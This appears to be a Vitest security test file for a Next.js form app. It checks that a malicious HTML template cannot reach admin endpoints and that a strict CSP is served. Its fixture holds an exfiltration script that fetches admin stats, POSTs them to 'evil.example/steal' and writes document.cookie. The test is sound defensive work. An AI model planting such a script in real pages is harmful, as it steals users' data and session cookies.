import { beforeAll, beforeEach, describe, expect, it } from "vitest";
import { cookieJar } from "../helpers/next-headers";
import { resetDatabase, seedForm, seedOperator } from "../helpers/db";
import { ctx, getRequest, jsonRequest, readJson } from "../helpers/request";
import { prisma } from "@/lib/db";
import { sessionOptions } from "@/lib/session";

import { POST as login } from "@/app/api/auth/login/route";
import { GET as campaignStats } from "@/app/api/stats/campaigns/route";
import { GET as listCampaigns } from "@/app/api/campaigns/route";
import { GET as listTemplates, POST as createTemplate } from "@/app/api/templates/route";
import { GET as listForms } from "@/app/api/forms/route";
import { GET as renderTemplate } from "@/app/f/[slug]/render/route";
import { POST as submit } from "@/app/api/public/forms/[slug]/submissions/route";

/** The exact attack the brief calls out: a template that tries to read the admin API. */
const MALICIOUS_TEMPLATE = `<!doctype html><html><body>
<form><input name="name"></form>
<script>
  fetch('/api/stats/campaigns').then(r => r.json()).then(d => {
    fetch('https://evil.example/steal', { method: 'POST', body: JSON.stringify(d) });
  });
  document.write(document.cookie);
</script>
</body></html>`;

beforeAll(async () => {
  await resetDatabase();
  await seedOperator();
});

beforeEach(() => cookieJar.clear());

describe("a malicious template cannot reach the admin API", () => {
  it("every admin endpoint answers 401 without a session", async () => {
    const responses = await Promise.all([
      campaignStats(getRequest("http://localhost:3000/api/stats/campaigns")),
      listCampaigns(),
      listTemplates(),
      listForms(getRequest("http://localhost:3000/api/forms")),
    ]);

    for (const response of responses) {
      expect(response.status).toBe(401);
      expect(await readJson(response)).toMatchObject({ error: { code: "UNAUTHORIZED" } });
    }
  });

  it("the stats endpoint leaks nothing in its 401 body", async () => {
    const response = await campaignStats(
      getRequest("http://localhost:3000/api/stats/campaigns"),
    );
    const body = JSON.stringify(await readJson(response));
    expect(body).not.toMatch(/campaignId|visits|visitors|submissions/);
  });
});

describe("template isolation at render time", () => {
  let slug: string;

  beforeAll(async () => {
    const campaign = await prisma.campaign.create({ data: { name: "보안 테스트" } });
    const template = await prisma.htmlTemplate.create({
      data: { name: "악성 템플릿", html: MALICIOUS_TEMPLATE, fieldNames: ["name"] },
    });
    const form = await prisma.form.create({
      data: {
        slug: "malicious",
        title: "악성",
        campaignId: campaign.id,
        templateId: template.id,
      },
    });
    slug = form.slug;
  });

  it("serves a CSP that blocks exfiltration and form hijacking", async () => {
    const response = await renderTemplate(
      getRequest(`http://localhost:3000/f/${slug}/render`),
      ctx({ slug }),
    );
    const csp = response.headers.get("content-security-policy") ?? "";

    // The template may only talk to our own host, and cannot post anywhere.
    expect(csp).toContain("connect-src http://localhost:3000");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("default-src 'self'");
    // It may not be framed by an arbitrary site.
    expect(csp).toMatch(/frame-ancestors http:\/\/localhost:3000/);
    // No remote script origins are permitted.
    expect(csp).not.toMatch(/script-src[^;]*https?:\/\//);
  });

  it("never sets or echoes the session cookie on the public render route", async () => {
    const response = await renderTemplate(
      getRequest(`http://localhost:3000/f/${slug}/render`),
      ctx({ slug }),
    );
    expect(response.headers.get("set-cookie")).toBeNull();
    expect(await response.text()).not.toContain(sessionOptions.cookieName);
  });

  it("does not serve the template outside a form context", async () => {
    const response = await renderTemplate(
      getRequest("http://localhost:3000/f/no-such-form/render"),
      ctx({ slug: "no-such-form" }),
    );
    expect(response.status).toBe(404);
  });
});

describe("the public submission endpoint is not general-purpose storage", () => {
  it("refuses keys the template never declared", async () => {
    await seedForm({ slug: "storage-test" });
    const response = await submit(
      jsonRequest(
        "http://localhost:3000/api/public/forms/storage-test/submissions",
        { data: { name: "ok", arbitrary_payload: "x".repeat(100) } },
        { headers: { origin: "null", "x-forwarded-for": "10.5.5.5" } },
      ),
      ctx({ slug: "storage-test" }),
    );
    expect(response.status).toBe(400);
  });
});

describe("template upload does not execute or sanitize the HTML", () => {
  it("stores the malicious markup verbatim — isolation is at render time", async () => {
    await login(
      jsonRequest("http://localhost:3000/api/auth/login", {
        email: "admin@example.com",
        password: "admin1234",
      }),
    );

    const response = await createTemplate(
      jsonRequest("http://localhost:3000/api/templates", {
        name: "verbatim",
        html: MALICIOUS_TEMPLATE,
      }),
    );
    expect(response.status).toBe(201);

    const { id } = (await readJson(response)) as { id: string };
    const stored = await prisma.htmlTemplate.findUniqueOrThrow({ where: { id } });
    // Deliberate (ADR 0003): rewriting operator HTML would silently break their
    // landing pages, so the script survives here and is neutralised by the sandbox.
    expect(stored.html).toContain("fetch('/api/stats/campaigns')");
  });
});
